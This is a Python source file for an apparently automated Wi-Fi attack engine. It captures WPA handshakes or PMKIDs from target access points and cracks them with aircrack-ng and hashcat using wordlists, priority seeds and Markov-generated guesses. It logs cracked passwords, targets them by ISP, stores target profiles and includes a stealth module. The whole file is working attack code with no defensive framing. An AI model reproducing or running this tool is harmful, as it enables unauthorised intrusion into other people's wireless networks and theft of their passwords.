import time
import os
import subprocess
import tempfile
import re
from core.error_handler import ErrorHandler


class RealAttackEngine:
    def __init__(self, config, error_handler):
        self.config = config
        self.error_handler = error_handler
        self.password_generator = None
        self.password_tester = None
        self.handshake_capture = None
        self.pmkid_capture = None
        self.async_engine = None
        self.performance_tracker = None
        self.hashcat_wrapper = None
        self.adaptive_engine = None
        self.hardware_optimizer = None
        self.client_tracker = None
        self.stealth_engine = None
        self.pmf_detector = None
        self.snr_engine = None
        self.multi_interface = None
        self.cracking_triage = None
        self.brain = None
        self.health_guardian = None
        self.scheduler = None
        self.attack_results = []

    def initialize_engine(self, hardware_optimizer=None):
        try:
            from engines.password_generator import PasswordGenerator
            from engines.password_tester import PasswordTester
            from engines.handshake_capture import HandshakeCapture
            from engines.pmkid_capture import PmkidCapture, AsyncCaptureEngine
            from engines.adaptive_engine import AdaptiveAttackEngine
            from engines.stealth_engine import ClientTracker, StealthEngine
            from engines.pmf_detector import PmfDetector
            from engines.snr_engine import SnrEngine
            from engines.multi_interface import MultiInterfaceManager
            from intelligence.cracking_triage import CrackingTriage
            from intelligence.health_guardian import HealthGuardian
            from learning.persistence_brain import PersistenceBrain
            from learning.smart_scheduler import SmartScheduler
            from learning.performance_tracker import PerformanceTracker
            from tools.hashcat_wrapper import HashcatWrapper

            self.hardware_optimizer = hardware_optimizer
            self.brain = PersistenceBrain()
            self.health_guardian = HealthGuardian(self.config, self.error_handler)
            self.scheduler = SmartScheduler(self.config, self.error_handler,
                                            persistence_brain=self.brain)
            self.password_generator = PasswordGenerator(self.config, self.error_handler)
            self.password_tester = PasswordTester(self.config, self.error_handler)
            self.handshake_capture = HandshakeCapture(self.config, self.error_handler)
            self.pmkid_capture = PmkidCapture(self.config, self.error_handler)
            self.async_engine = AsyncCaptureEngine(
                self.config, self.error_handler,
                self.handshake_capture, self.pmkid_capture,
            )
            self.performance_tracker = PerformanceTracker(self.config)
            self.hashcat_wrapper = HashcatWrapper(self.config, self.error_handler)
            self.adaptive_engine = AdaptiveAttackEngine(
                self.config, self.error_handler,
                self.password_generator, self.password_tester,
            )
            self.client_tracker = ClientTracker(self.config, self.error_handler)
            self.stealth_engine = StealthEngine(self.config, self.error_handler)
            self.pmf_detector = PmfDetector(self.config, self.error_handler)
            self.snr_engine = SnrEngine(self.config, self.error_handler)
            self.multi_interface = MultiInterfaceManager(self.config, self.error_handler)
            self.cracking_triage = CrackingTriage(self.config, self.error_handler)

            return True
        except Exception as e:
            self.error_handler.handle_error("E300", "Real attack engine init failed", e)
            return False

    def execute_real_attack(self, target, interface="wlan0mon",
                             max_duration=3600, seeds=None, wordlist=None):
        bssid = target.get("bssid", "")
        ssid = target.get("ssid", "?")
        channel = target.get("channel", 1)
        signal = target.get("signal_strength", -100)

        print(f"\n   TARGET: {ssid} ({bssid})")
        print(f"   Signal: {signal} dBm  |  Channel: {channel}")

        start_time = time.time()
        result = {
            "target": target,
            "success": False,
            "password": None,
            "duration": 0,
            "tested_count": 0,
            "handshake_captured": False,
            "pmkid_captured": False,
            "method": None,
            "pmf_detected": False,
            "snr_passed": False,
            "isp_match": None,
            "wordlist_used": wordlist,
            "errors": [],
        }

        try:
            rc_interface = interface
            roles = self.multi_interface.assign_roles(interface)
            if not roles["single_radio"]:
                rc_interface = roles["executioner"]
                print(f"   Executioner: {rc_interface}")

            pmf = self.pmf_detector.get_attack_strategy(bssid, channel, rc_interface)
            result["pmf_detected"] = pmf.get("pmf_required", False)

            if pmf.get("pmf_required"):
                result["method"] = "pmkid_only"
                print(f"   PMF required → PMKID-only attack")
                pm_file = self.pmkid_capture.capture_pmkid(
                    bssid, channel, rc_interface, timeout=120,
                )
                if pm_file:
                    result["pmkid_captured"] = True
                    found_pw, tested = self._crack_pmkid(
                        bssid, pm_file, target, max_duration, signal, seeds, result,
                    )
                    result["success"] = found_pw is not None
                    result["password"] = found_pw
                    result["tested_count"] = tested
                    result["duration"] = time.time() - start_time
                    self.performance_tracker.record_attack(target, result)
                    self._record_to_brain(target, result, bssid, ssid)
                    self.attack_results.append(result)
                    return result
                else:
                    result["errors"].append("PMKID capture failed (PMF mode)")
                    self.performance_tracker.record_attack(target, result)
                    self._record_to_brain(target, result, bssid, ssid)
                    return result

            noise_floor = self.snr_engine.get_noise_floor(rc_interface)
            snr_check = self.snr_engine.evaluate_target(target, noise_floor)
            if not snr_check["passed"]:
                result["errors"].append(
                    "; ".join(snr_check["failed_reasons"])
                )
                self.snr_engine.blacklist_target(
                    bssid, "; ".join(snr_check["failed_reasons"])
                )
                print(f"   SNR reject: {result['errors'][-1]}")
                self.performance_tracker.record_attack(target, result)
                self._record_to_brain(target, result, bssid, ssid)
                return result

            result["snr_passed"] = True
            adaptive_to = snr_check["adaptive_timeout"]
            print(f"   SNR {snr_check['snr']}dB | adaptive timeout: {adaptive_to}s")

            pmkid_installed = self.pmkid_capture.is_available()
            if pmf.get("pmf_capable") and pmkid_installed:
                print(f"   PMF capable + hcxdumptool → PMKID preferred")
                capture_result = self.async_engine.capture_dual(
                    bssid, channel, rc_interface, timeout=adaptive_to,
                )
            else:
                print(f"   Multi-client traffic scan for client targeting...")
                clients = self.client_tracker.scan_clients_with_traffic(
                    bssid, channel, rc_interface, scan_time=10,
                )
                traffic_info = self.client_tracker.get_traffic_summary(bssid)
                print(f"   Clients: {len(clients)} ({traffic_info})")

                existing_hs = self.handshake_capture.find_existing_handshake(bssid)
                if existing_hs:
                    result["handshake_captured"] = True
                    result["method"] = "existing_handshake"
                    capture_result = {"type": "handshake", "file": existing_hs}
                    print(f"   Using existing handshake: {existing_hs}")
                else:
                    print(f"   Dual parallel capture (handshake + PMKID)...")
                    capture_result = self.async_engine.capture_dual(
                        bssid, channel, rc_interface, timeout=adaptive_to,
                    )

            if not capture_result:
                result["errors"].append("Both handshake and PMKID capture failed")
                self.performance_tracker.record_attack(target, result)
                self._record_to_brain(target, result, bssid, ssid)
                return result

            cap_type = capture_result["type"]
            cap_file = capture_result["file"]
            result["method"] = capture_result["method"]

            triage_seeds = self.cracking_triage.build_priority_seeds(target)
            isp_name = self.cracking_triage.classify_isp(ssid)
            if isp_name:
                result["isp_match"] = isp_name

            merged_seeds = list(seeds) if seeds else []
            for cat, pw in triage_seeds:
                if pw not in merged_seeds:
                    merged_seeds.append(pw)
            if merged_seeds:
                print(
                    f"   Priority seeds: {len(merged_seeds)} "
                    f"({len(triage_seeds)} from triage)"
                )

            if cap_type == "handshake":
                result["handshake_captured"] = True
                print(f"   Handshake captured: {cap_file}")
                found_pw, tested = self._crack_handshake(
                    bssid, cap_file, target, max_duration, signal,
                    merged_seeds or None, result,
                )
            elif cap_type == "pmkid":
                result["pmkid_captured"] = True
                print(f"   PMKID captured: {cap_file}")
                found_pw, tested = self._crack_pmkid(
                    bssid, cap_file, target, max_duration, signal,
                    merged_seeds or None, result,
                )
            else:
                result["errors"].append(f"Unknown capture type: {cap_type}")
                self.performance_tracker.record_attack(target, result)
                self._record_to_brain(target, result, bssid, ssid)
                return result

            result["success"] = found_pw is not None
            result["password"] = found_pw
            result["tested_count"] = tested
            result["duration"] = time.time() - start_time

            if found_pw:
                print(" " * 60, end="\r")
                print(f"   CRACKED: {found_pw}")
            else:
                print(" " * 60, end="\r")
                print(f"   Failed after {tested:,} tests")

            self.performance_tracker.record_attack(target, result)
            self._record_to_brain(target, result, bssid, ssid)
            self.attack_results.append(result)
            return result

        except Exception as e:
            eid = self.error_handler.handle_error(
                "E300", f"Attack failed on {ssid}", e)
            result["errors"].append(f"Error {eid}: {e}")
            result["duration"] = time.time() - start_time
            return result

    def _crack_handshake(self, bssid, handshake_file, target,
                         max_duration, signal, seeds, result):
        if not self.password_tester.setup_handshake_test(handshake_file):
            result["errors"].append("Handshake setup failed")
            return None, 0

        wordlist = result.get("wordlist_used")
        if wordlist and os.path.isfile(wordlist):
            print(f"   Trying wordlist: {wordlist}")
            found_pw, tested = self._try_wordlist_aircrack(
                bssid, handshake_file, wordlist, result,
            )
            if found_pw:
                return found_pw, tested

        print(f"   Cracking handshake with adaptive pipeline...")
        from intelligence.password_intelligence import PasswordIntelligence
        pi = PasswordIntelligence()

        if seeds:
            plan = pi.generate_attack_plan(target, max_duration)
            plan["seeds"] = list(dict.fromkeys(list(seeds) + plan["seeds"]))
        else:
            plan = pi.generate_attack_plan(target, max_duration)

        signal_factor = max(0.3, min(1.0, (signal + 90) / 60))
        adjusted_time = max(60, int(max_duration * signal_factor))
        plan["time_budget"] = adjusted_time

        found_pw, tested = self.adaptive_engine.execute_intelligent_crack(
            target, handshake_file, bssid, plan,
            max_tests=10000000,
        )
        return found_pw, tested

    def _crack_pmkid(self, bssid, pmkid_file, target,
                     max_duration, signal, seeds, result):
        pmkid_available = self.pmkid_capture.is_available()
        if not pmkid_available:
            print(f"   PMKID captured but hashcat not available, skipping crack")
            return None, 0

        gpu = self.hardware_optimizer.detect_gpu() if self.hardware_optimizer else {}
        use_gpu = gpu.get("available", False)

        wordlist = result.get("wordlist_used")
        if wordlist and os.path.isfile(wordlist):
            print(f"   Trying wordlist: {wordlist}")
            found_pw, tested = self._try_wordlist_hashcat(
                pmkid_file, wordlist, use_gpu, result,
            )
            if found_pw:
                return found_pw, tested

        if use_gpu:
            print(f"   Cracking PMKID with hashcat (GPU acceleration)...")
        else:
            print(f"   Cracking PMKID with hashcat (CPU)...")

        from intelligence.password_intelligence import PasswordIntelligence
        pi = PasswordIntelligence()
        plan = pi.generate_attack_plan(target, max_duration)
        if seeds:
            plan["seeds"] = list(dict.fromkeys(list(seeds) + plan["seeds"]))

        phase = plan.get("phases", [{}])[0] if plan.get("phases") else {}
        base_seeds = phase.get("seeds", plan.get("seeds", []))
        max_tests = min(5000000, int(max_duration * 5000))

        tested = 0
        found_pw = None
        result["_crack_start"] = time.time()

        for password in self._seed_generator(base_seeds, max_tests):
            if found_pw:
                break
            if tested >= max_tests:
                break

            test_result = self._test_hashcat_single(pmkid_file, password, use_gpu)
            if test_result:
                found_pw = password
                break

            tested += 1
            if tested % 10000 == 0:
                elapsed = max(0.1, time.time() - result["_crack_start"])
                speed = tested / elapsed if elapsed > 0 else 0
                print(f"   PMKID crack: {tested:,} tested ({speed:,.0f} p/s)", end="\r")

        print(" " * 60, end="\r")
        return found_pw, tested

    def _try_wordlist_aircrack(self, bssid, handshake_file, wordlist, result):
        try:
            import tempfile
            r = subprocess.run(
                ["aircrack-ng", "-b", bssid, "-w", wordlist, handshake_file],
                capture_output=True, text=True, timeout=300,
            )
            if "KEY FOUND" in r.stdout:
                m = re.search(r"KEY FOUND.*?\[(.*?)\]", r.stdout)
                if m:
                    return m.group(1), 1
            return None, 0
        except subprocess.TimeoutExpired:
            print(f"   Wordlist timeout (300s), continuing...")
            return None, 0
        except Exception:
            return None, 0

    def _try_wordlist_hashcat(self, hash_file, wordlist, use_gpu, result):
        try:
            cmd = [
                "hashcat", "-m", "22000",
                "-a", "0",
                hash_file, wordlist,
                "--potfile-disable",
                "--runtime-limit=300",
            ]
            if use_gpu:
                cmd.extend(["-D", "2"])
            else:
                cmd.extend(["-D", "1"])
            cmd.append("--force")

            r = subprocess.run(cmd, capture_output=True, text=True, timeout=310)
            if r.returncode == 0:
                show = subprocess.run(
                    ["hashcat", "-m", "22000", "--show", hash_file,
                     "--potfile-disable"],
                    capture_output=True, text=True, timeout=10,
                )
                if show.stdout.strip():
                    pw = show.stdout.strip().split(":")[-1] if ":" in show.stdout.strip() else show.stdout.strip()
                    return pw, 1
            return None, 0
        except subprocess.TimeoutExpired:
            print(f"   Hashcat wordlist timeout (300s), continuing...")
            return None, 0
        except Exception:
            return None, 0

    def _seed_generator(self, seeds, max_count):
        seen = set()
        for s in seeds:
            s = s.strip()
            if s and s not in seen:
                seen.add(s)
                yield s
                if len(seen) >= max_count:
                    return

        from intelligence.password_intelligence import MarkovChain
        mc = MarkovChain()
        mc.train(seeds)

        for _ in range(max_count - len(seen)):
            pw = mc.generate()
            if pw and pw not in seen:
                seen.add(pw)
                yield pw

    def _test_hashcat_single(self, hash_file, password, use_gpu):
        try:
            with tempfile.NamedTemporaryFile(mode="w", delete=False,
                                              suffix=".txt") as f:
                f.write(password + "\n")
                f.flush()
                tmp_path = f.name

            cmd = [
                "hashcat", "-m", "22000",
                "-a", "0",
                hash_file, tmp_path,
                "--potfile-disable",
                "--runtime-limit=10",
            ]
            if use_gpu:
                cmd.extend(["-D", "2"])
            else:
                cmd.extend(["-D", "1"])
            cmd.append("--force")

            r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            os.unlink(tmp_path)

            if r.returncode == 0:
                show = subprocess.run(
                    ["hashcat", "-m", "22000", "--show", hash_file,
                     "--potfile-disable"],
                    capture_output=True, text=True, timeout=10,
                )
                if show.stdout.strip():
                    return True

            if "Cracked" in r.stdout or password in r.stdout:
                return True

            return False
        except Exception:
            return False

    def _record_to_brain(self, target, result, bssid, ssid):
        try:
            self.brain.log_attack(
                bssid=bssid, ssid=ssid,
                success=result.get("success", False),
                password=result.get("password"),
                method=result.get("method"),
                duration=result.get("duration"),
                tested_count=result.get("tested_count"),
                capture_type="handshake" if result.get("handshake_captured") else (
                    "pmkid" if result.get("pmkid_captured") else None
                ),
                signal=target.get("signal_strength"),
                snr=target.get("snr"),
                errors=result.get("errors"),
            )

            self.brain.update_target_profile(
                bssid=bssid, ssid=ssid,
                channel=target.get("channel"),
                encryption=target.get("encryption"),
                signal=target.get("signal_strength"),
                vendor=result.get("isp_match"),
                oui_prefix=bssid[:8].upper() if len(bssid) >= 8 else "",
            )

            if result.get("handshake_captured"):
                self.brain.record_handshake_attempt(bssid, result["handshake_captured"])
            if result.get("pmkid_captured"):
                self.brain.record_pmkid_attempt(bssid, result["pmkid_captured"])

            if result.get("success") and result.get("password"):
                self.brain.mark_cracked(bssid, result["password"])
                self.brain.record_cracked_password(result["password"])

                ssid_pattern = target.get("ssid_pattern", "unknown")
                self.brain.record_weight("ssid_pattern", ssid_pattern, True)

                vendor = result.get("isp_match") or "unknown"
                self.brain.record_weight("vendor_pattern", vendor, True)

                enc = target.get("encryption", "unknown")
                self.brain.record_weight("encryption_type", enc, True)
            else:
                ssid_pattern = target.get("ssid_pattern", "unknown")
                self.brain.record_weight("ssid_pattern", ssid_pattern, False)

            self.scheduler.record_client_hour(bssid)
        except Exception:
            pass

    def get_attack_statistics(self):
        total = len(self.attack_results)
        ok = len([r for r in self.attack_results if r["success"]])
        hc = len([r for r in self.attack_results if r.get("handshake_captured", False)])
        pm = len([r for r in self.attack_results if r.get("pmkid_captured", False)])
        tested = sum(r["tested_count"] for r in self.attack_results)
        avg_time = (sum(r["duration"] for r in self.attack_results) / total
                    if total > 0 else 0)
        return {
            "total_attacks": total,
            "successful_attacks": ok,
            "success_rate": ok / total if total > 0 else 0,
            "handshake_capture_rate": hc / total if total > 0 else 0,
            "pmkid_capture_rate": pm / total if total > 0 else 0,
            "total_tested": tested,
            "average_time": avg_time,
        }
